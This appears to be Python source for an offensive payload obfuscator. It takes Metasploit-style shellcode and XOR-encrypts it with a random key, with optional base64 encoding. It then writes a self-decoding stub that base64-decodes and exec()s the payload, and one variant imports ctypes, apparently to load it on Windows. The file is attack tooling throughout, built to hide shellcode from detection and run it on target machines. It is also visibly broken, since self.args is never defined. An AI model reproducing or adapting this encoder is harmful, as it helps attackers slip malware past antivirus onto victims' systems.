#!/usr/bin/env python

import os 
import re
import sys
import base64
import secrets

class _MSF_Call:
    def __init__(self):
        self._Features()
        self.DecodeShell()
    def _Features(self,**kwargs):
        if (self.args.decode and self.args.exploit) and not (self.args.assembly) :
            with open (self.args.exploit,'rt') as TEXT:
                Text = TEXT.readlines()
                Text = "\n".join(re.findall('"+.+"',"".join(Text[1:])))
            with open (os.getcwd()+'/Package/Template/ShellCode.txt','wt') as TEXT:
                TEXT.write(Text)
        if self.args.assembly  :
            with open (os.getcwd()+'/Package/Template/FileNameObjectShellCode','rt') as TEXT:
                Text = TEXT.readlines()
            with open (os.getcwd()+'/Package/Template/ShellCode.txt','wt') as Shell:
                if self.args.load and not(self.args.decode):
                    Shell.write('ShellCode = b""\n')
                elif self.args.decode:
                    Text = "\n".join(re.findall('"+.+"',"".join(Text[1:])))
                    Text = Shell.write(Text)    

                else:    
                    Shell.write('ShellCode = b""\n')   

        else:
            if self.args.decode:
                 pass
            else:     
                with open (self.args.exploit,'rt') as TEXT:
                    Text = TEXT.readlines()
                if ('\\x' not in Text ) and not ( self.args.load) :
                    with open (os.getcwd()+'/Package/Template/ShellCode.txt','wt') as Shell:  
                        Shell = Shell.write(str("".join(Text))) 
                else:          
                    with open (os.getcwd()+'/Package/Template/ShellCode.txt','wt') as Shell:
                        if self.args.load :
                                Shell.write('ShellCode = b""\n')
                        else:    
                                Shell.write('ShellCode = b""\n')  
        if (self.args.load or "\\x" in Text or self.args.assembly) and not (self.args.decode):                                            
            for L in Text[1:] :
                Find_Str = re.findall('"+.+"',L)
                CompleteShell = 'ShellCode += b'+str("".join(Find_Str).replace('[]','',1))+'\n'
                with open (os.getcwd()+'/Package/Template/ShellCode.txt','at') as Shell:
                    if 'ShellCode += b"\\x'in CompleteShell :
                        if self.args.load:
                            Shell.write('    '+CompleteShell) 
                        else:
                             Shell.write(CompleteShell)   
                    else:
                        pass 

if __name__=='__main__':
   _MSF_Call()   
   
class Xor_class :

    def __init__(self):
        self.Gen_Key()
        self.Xor_Process()
        self.Fainal_Stage()

    def Gen_Key(self,**kwargs):  
        if self.args.load:
             with open (os.getcwd()+'/Package/Template/TempPayloadLoader.txt','r') as payload:
                if self.args.P_base64:
                    payload = payload.read()
                    payload = base64.b64encode(payload.encode())    
                else:
                    payload = bytes(payload.read().encode()) 
        else:         
            with open (os.getcwd()+'/Package/Template/ShellCode.txt','r') as payload:
                if self.args.P_base64:
                    payload = payload.read()
                    payload = base64.b64encode(payload.encode())
                else:
                    payload = bytes(payload.read().encode())   
        Value_Key =  secrets.token_bytes(len(payload))

        if self.args.Key_base64:
           Value_Key = base64.b64encode(Value_Key)
        self.payload = payload
        self.Value_Key = Value_Key

    def Xor_Process(self,**kwargs):
       
        if self.args.Key_base64: 
            self.Value_Key = base64.b64decode(self.Value_Key)  
        self.Xor_Payload = bytes([ I  ^ L for I , L in zip(self.payload ,self.Value_Key) ])
   
    def Fainal_Stage(self,**kwargs) : 
        with open(os.getcwd()+"/"+'StoreCode/'+self.args.output,'w') as XP_load:
            if self.args.load:
                XP_load1 = 'shell = '+str(self.Xor_Payload)+'\n'+'Key = '+str(self.Value_Key)+'\n'+\
                "de_code = bytes([ Z ^ C for Z , C in zip(shell , Key)])"+'\n'+'import base64\n'+\
                'de_set = base64.b64decode(de_code).decode("utf-8")'+'\n'+'exec(de_set)'
                XP_load.write("import base64\nimport ctypes\nimport ctypes.wintypes as wt\nexec(base64.b64decode("+\
                str(base64.b64encode((XP_load1.encode())))+'))')
            else:
                XP_load1 = 'shell = '+str(self.Xor_Payload)+'\n'+'Key = '+str(self.Value_Key)+'\n'+\
                "de_code = bytes([ Z ^ C for Z , C in zip(shell , Key)])"+'\n'+'import base64\n'+\
                'de_set = base64.b64decode(de_code).decode("utf-8")'+'\n'+'exec(de_set)'
                XP_load.write("import base64\nexec(base64.b64decode("+str(base64.b64encode((XP_load1.encode())))+'))')   
        
if __name__=='__main__':
   Xor_class()   
